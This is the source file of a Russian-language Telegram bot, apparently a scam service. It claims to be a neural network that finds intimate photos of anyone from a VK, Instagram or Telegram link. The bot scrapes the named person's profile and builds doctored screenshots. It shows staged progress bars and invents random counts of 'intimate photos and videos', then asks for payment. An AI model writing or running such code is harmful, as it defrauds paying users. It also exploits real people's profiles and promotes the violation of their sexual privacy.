from loader import dp, html, bot, db, Disc
from aiogram.utils.markdown import hlink
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import CommandStart
from aiogram.types import Message, CallbackQuery
from src.keyboards.inline import search_inline, start_menu, first_step
from src.parse.scrapp import get_inf_tg, get_inf_vk, get_inf_inst
from src.change.photoshop import change_screen_vk, change_screen_tg, change_screen_inst
import random
from config import admin_ids
import asyncio
import shutil


"""


"""

async def load_pack(msg):
    online=random.randint(150, 500)
    msg_id= await msg.answer(text=f"""
⚡️Соединение...

          ⏳ ЗАГPУЗKА: 20%
▸ 🟩🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
        
🔞 Всeгo в бaзe: 32465364
💬 Сeйчaс ищyт: {online}""", parse_mode=html)
    await asyncio.sleep(1)
    await bot.edit_message_text(chat_id=msg.chat.id, message_id=msg_id.message_id, text=f"""
⚡️Соединение...

          ⏳ ЗАГPУЗKА: 40%
▸ 🟩🟩🟩🟩⬜️⬜️⬜️⬜️⬜️⬜️
        
🔞 Всeгo в бaзe: 32465364
💬 Сeйчaс ищyт: {online}""", parse_mode=html)
    await bot.edit_message_text(chat_id=msg.chat.id, message_id=msg_id.message_id, text=f"""
🔎 Поиск...

          ⏳ ЗАГPУЗKА: 50%
▸ 🟩🟩🟩🟩🟩⬜️⬜️⬜️⬜️⬜️
        
🔞 Всeгo в бaзe: 32465364
💬 Сeйчaс ищyт: {online}""", parse_mode=html)
    await asyncio.sleep(2)
    await bot.edit_message_text(chat_id=msg.chat.id, message_id=msg_id.message_id, text=f"""
🔎 Поиск...

          ⏳ ЗАГPУЗKА: 70%
▸ 🟩🟩🟩🟩🟩🟩🟩⬜️⬜️⬜️
        
🔞 Всeгo в бaзe: 32465364
💬 Сeйчaс ищyт: {online}""", parse_mode=html)
    await asyncio.sleep(2)
    await bot.edit_message_text(chat_id=msg.chat.id, message_id=msg_id.message_id, text=f"""
📝Распаковка архива

          ⏳ ЗАГPУЗKА: 80%
▸ 🟩🟩🟩🟩🟩🟩🟩🟩⬜️⬜️
        
🔞 Всeгo в бaзe: 32465364
💬 Сeйчaс ищyт: {online}""", parse_mode=html)
    await asyncio.sleep(1)
    await bot.edit_message_text(chat_id=msg.chat.id, message_id=msg_id.message_id, text=f"""
📝Распаковка архива

          ⏳ ЗАГPУЗKА: 99%
▸ 🟩🟩🟩🟩🟩🟩🟩🟩🟩⬜️
        
🔞 Всeгo в бaзe: 32465364
💬 Сeйчaс ищyт: {online}""", parse_mode=html)
    await asyncio.sleep(1)
    await bot.edit_message_text(chat_id=msg.chat.id, message_id=msg_id.message_id, text=f"""
✅ГОТОВО

          ⏳ ЗАГPУЗKА: 99%
▸ 🟩🟩🟩🟩🟩🟩🟩🟩🟩⬜️
        
🔞 Всeгo в бaзe: 32465364
💬 Сeйчaс ищyт: {online}""", parse_mode=html)
    await asyncio.sleep(2)
    await bot.delete_message(chat_id=msg.chat.id, message_id=msg_id.message_id)

async def load_pack2(msg):
    msg_id= await msg.answer(text="✅ Создаю архив\n\n⏳Отправка материала... 20%\n🟩🟩🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️", parse_mode=html)
    await asyncio.sleep(2)
    await bot.edit_message_text(chat_id=msg.chat.id, message_id=msg_id.message_id, text="✅ Создаю архив\n\n⏳Отправка материала... 64%\n🟩🟩🟩🟩🟩⬜️⬜️⬜️⬜️⬜️", parse_mode=html)
    await asyncio.sleep(2)
    await bot.edit_message_text(chat_id=msg.chat.id, message_id=msg_id.message_id,text="✅ Создаю архив\n\n⏳Отправка материала... 87%\n🟩🟩🟩🟩🟩🟩🟩🟩⬜️⬜️", parse_mode=html)
    await asyncio.sleep(2)
    await bot.edit_message_text(chat_id=msg.chat.id, message_id=msg_id.message_id,text="✅ Создаю архив\n\n⏳Отправка материала... 98%\n🟩🟩🟩🟩🟩🟩🟩🟩🟩⬜️", parse_mode=html)
    await asyncio.sleep(1)
    await bot.delete_message(chat_id=msg.chat.id, message_id=msg_id.message_id)
    
@dp.message_handler(CommandStart(), state="*")
@dp.message_handler(CommandStart())
async def start_message(msg: Message, state: FSMContext):
    await state.finish()
    print(msg.chat.id)
    if msg.chat.type == 'private':
        if not(db.user_exist(msg.from_user.id, 'users')):
            db.add_user(msg.from_user.id, msg.from_user.username)
        db.exist_name(msg.chat.id, 
                      msg.chat.username)

        name= msg.chat.first_name if msg.chat.first_name else ""
        name+= f" {msg.chat.last_name}" if msg.chat.last_name else ""
        await msg.answer(
            text=f"""
👋Пpивeт, {name}?!            

🤖 Я - Heйpoceть, koтoрaя ищeт интимные фoтo в тыcячax бaз пo вceму интepнeту.

🔎 Oтпpaвь мне ccылку нa ВKoнтaктe, Instagrаm, Тelegram или нoмep тeлeфoнa!

☺️Kaк рaбoтaeт ФoтoПoиcк - https://telegra.ph/Kak-rabotaet-fotopoisk-11-11

Используя бот вы coглaшaeтecь c {hlink('oфeртoй нa okaзaниe инфoрмaциoнныx уcлуг', 'https://telegra.ph/OFERTA-NA-OKAZANIE-INFORMACIONNYH-USLUG-11-06-2')}""",
                        reply_markup=start_menu,
                        parse_mode=html,
                        disable_web_page_preview=True
        )
        
@dp.message_handler(commands=['link'], state="*")
async def link_command(msg: Message):
    link= msg.text.replace('/link', "").strip()
    try:
        db.set_link(link)
        await msg.answer("Ссылка изменена!")
    except Exception as ex:
        print(ex)

@dp.message_handler(commands=['ras'])
async def command_handler(msg: Message, state: FSMContext):
    if msg.chat.type == 'private':
        if admin_ids.__contains__(msg.chat.id):
            await msg.answer(text=f"Введи текст для рассылки:")
            await Disc.Q1.set()

@dp.callback_query_handler(text= 'search')
async def search_answer(call: CallbackQuery):
    await call.message.answer(text=f"""
🆘 Вы мoжeтe пpиcлaть бoтy зaпpoсы в слeдyющeм фopмaтe:

🌐 Вкoнтaктe
├ https://vk.com/chapaevva
└ vk.com/chapaevva

👤 Viber/What's Up
└ 79115553452 

📸 Инстaгpaм
├ http://www.instagram.com/buzova86
├ https://instagram.com/buzova86
└ instagram.com/buzova86""")
    
# @dp.callback_query_handler(text_contains='soc_')
# async def soc_menu(call: CallbackQuery):
#     if call.data == 'soc_vk':
#         await call.message.edit_text(f"🔗 Отправьте боту ссылку на страницу, или ID пользователя <b>👤 ВКонтакте</b>\n\n"
#                                   +f"Пример:\n├ https://vk.com/example\n└ vk.com/example", parse_mode=html)
#     if call.data == 'soc_tg':
#         await call.message.edit_text(f"🔗 Отправьте боту ссылку на профиль <b>👥 Телеграм</b>\n\n"
#                                   +f"Пример:\n├ @ex_a_mple\n├ t.me/ex_a_mple\n└ https://t.me/ex_a_mple", parse_mode=html)
#     if call.data == 'soc_inst':
#         await call.message.edit_text(f"""
# 🔗 Отправьте боту ссылку на страницу Instagram

# Пример:
# ├ http://www.instagram.com/buzova86
# ├ https://instagram.com/buzova86
# ├ instagram.com/buzova86""", parse_mode=html)

@dp.message_handler(content_types=['text'])
async def get_link(msg: Message):
    if not(db.user_exist(msg.from_user.id, 'users')):
        db.add_user(msg.from_user.id, msg.from_user.username)
    db.exist_name(msg.chat.id, 
                      msg.chat.username)
    await msg.answer("Идёт поиск... 🔎\n\nПодождите 5-15 секунд...")
    if msg.text.startswith('@') or msg.text.__contains__('t.me/'):
        if msg.text.__contains__('https://'):
            link= msg.text
        elif msg.text.startswith('@'):
            link= f"https://t.me/{msg.text[1:]}"
        else:
            link= f"https://{msg.text}"
        name=get_inf_tg(link, msg.chat.id)
        if name == None:
            await msg.answer("❌ Архив не найден\n\nПопробуй другую ссылку!")
        else:
            num_pack= random.randint(1,4)
            count_video=random.randint(1, 35)
            count_photo= random.randint(20, 56)
            id1= random.randint(1000000, 9999999)
            media=change_screen_tg(
                name=name,
                user_id=msg.chat.id,
                num_pack=num_pack
            )
        sliv_info={
            'user_id' : msg.chat.id,
            'link' : f"{link}"
        }
        if not(db.user_exist(msg.chat.id)):
            db.addIn_sliv(sliv_info)
        else:
            db.edit_sliv(sliv_info)
        await load_pack(msg)
        await bot.send_media_group(chat_id=msg.chat.id, media=media)
        await bot.send_message(chat_id=msg.chat.id, text= f"""
✅ Проверка выполнена!

🌐 Ссылка:  {link}
🙍‍♀️Пользователь: {name}

ID пользователя: {id1}
Онлайн: Нет

📷Интим фото: {count_photo} шт. ✅
📹Интим видео: {count_video} шт. ✅
💬Переписки {random.randint(10, 73)} шт.✅
👥️Скрытые друзья {random.randint(1, 10)} шт.✅                        
""")    
            # await load_pack2(msg)
            # await bot.send_media_group(chat_id=msg.chat.id, media=media_pack)
        shutil.rmtree(f'src/change/new_screens/{msg.chat.id}')
        await msg.answer('<b>Для того, чтобы получить доступ к материалам выбирай нужный тариф и жми кнопку «Оплатить» 👇🏻</b>',
                            reply_markup=first_step,
                            parse_mode=html,
                            disable_web_page_preview=True)            
    elif msg.text.__contains__('vk.com/'):
        link= msg.text
        result= await get_inf_vk(link, msg.chat.id)
        if result == None or result[1] == 'm' or result[1] == None:
            await msg.answer("❌ Архив не найден\n\nПопробуй другую ссылку!")
        else:
            count_video=random.randint(1, 35)
            num_pack= random.randint(1,4)
            media= change_screen_vk(result[0], msg.chat.id, num_pack)
            # media_pack= photo_pack(
            #     name=result[0],
            #     user_id=msg.chat.id,
            #     count_video= count_video,
            #     num_pack=num_pack,
            #     name_pack='vk')
            sliv_info={
                'user_id' : msg.chat.id,
                'link' : f"{link}"
            }
            if not(db.user_exist(msg.chat.id)):
                db.addIn_sliv(sliv_info)
            else:
                db.edit_sliv(sliv_info)
            await load_pack(msg)
            await bot.send_media_group(chat_id=msg.chat.id, media=media)
            await bot.send_message(chat_id=msg.chat.id, text= f"""
✅ Проверка выполнена!

🌐 Ссылка:  {link}
🙍‍♀️Пользователь: {result[0]}

ID пользователя: {result[2]}
Онлайн: Нет

📷Интим фото: {random.randint(20, 56)} шт. ✅
📹Интим видео: {count_video} шт. ✅
💬Переписки {random.randint(10, 73)} шт.✅
👥️Скрытые друзья {random.randint(1, 10)} шт.✅                        
""")    
            # await load_pack2(msg)
            # await bot.send_media_group(chat_id=msg.chat.id, media=media_pack)
            shutil.rmtree(f'src/change/new_screens/{msg.chat.id}')
            await msg.answer('<b>Для того, чтобы получить доступ к материалам выбирай нужный тариф и жми кнопку «Оплатить» 👇🏻</b>',
                             reply_markup=first_step,
                             parse_mode=html,
                             disable_web_page_preview=True)
    elif msg.text.__contains__('instagram.com'):
        if not(msg.text.__contains__('http')):
            link= f"https://{msg.text}"
        else:
            link= f"{msg.text}"
        link_parse= link.split('/')[-1]
        name= await get_inf_inst(link=link_parse, user_id=msg.chat.id)
        if name == None:
            await msg.answer("❌ Архив не найден\n\nПопробуй другую ссылку!")
        else:
            num_pack= random.randint(1,4)
            count_video=random.randint(1, 35)
            id1=random.randint(1000000, 9999999)
            media= change_screen_inst(
                name=name,
                user_id=msg.chat.id,
                num_pack=num_pack
            )
            # media_pack= photo_pack(
            #     name=name,
            #     user_id=msg.chat.id,
            #     count_video= count_video,
            #     num_pack=num_pack,
            #     name_pack='inst')
            sliv_info={
                'user_id' : msg.chat.id,
                'link' : f"{link}"
            }
            if not(db.user_exist(msg.chat.id)):
                db.addIn_sliv(sliv_info)
            else:
                db.edit_sliv(sliv_info)
            await load_pack(msg)
            await bot.send_media_group(chat_id=msg.chat.id, media=media)
            await bot.send_message(chat_id=msg.chat.id, text= f"""
✅ Проверка выполнена!

🌐 Ссылка:  {link}
🙍‍♀️Пользователь: {name}

ID пользователя: {id1}
Онлайн: Нет

📷Интим фото: {random.randint(20, 56)} шт. ✅
📹Интим видео: {count_video} шт. ✅
💬Переписки {random.randint(10, 73)} шт.✅
👥️Скрытые друзья {random.randint(1, 10)} шт.✅                        
""")
            # await load_pack2(msg)
            # await bot.send_media_group(chat_id=msg.chat.id, media=media_pack)
            shutil.rmtree(f'src/change/new_screens/{msg.chat.id}')
            await msg.answer('<b>Для того, чтобы получить доступ к материалам выбирай нужный тариф и жми кнопку «Оплатить» 👇🏻</b>',
                             reply_markup=first_step,
                             parse_mode=html,
                             disable_web_page_preview=True)
    else:
        await msg.answer("❌ Архив не найден\n\nПопробуй другую ссылку!")